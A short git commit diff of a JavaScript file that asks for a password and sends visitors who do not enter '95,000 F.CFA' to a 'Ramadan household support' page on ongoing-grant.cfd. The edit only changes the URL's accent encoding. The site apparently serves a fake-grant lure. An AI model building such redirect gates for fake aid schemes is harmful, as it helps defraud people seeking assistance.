ab2b80597ab8a21f818fb4874df3726aaf3fed0e
The-ongoing <preciousadaowo4@gmail.com>
2026-02-23 00:13:56 +0100

    Update activeramadan2.js

--- activeramadan2.js
+++ activeramadan2.js
@@ -6,5 +6,5 @@ password = prompt(
 );
 
 if (password !== '95,000 F.CFA') {
-    location.href = 'https://ongoing-grant.cfd/Soutien-Aux-M%C3%A9nages-Du-Ramadan.html';
+    location.href = 'https://ongoing-grant.cfd/Soutien-Aux-Menages-Du-Ramadan.html';
 }
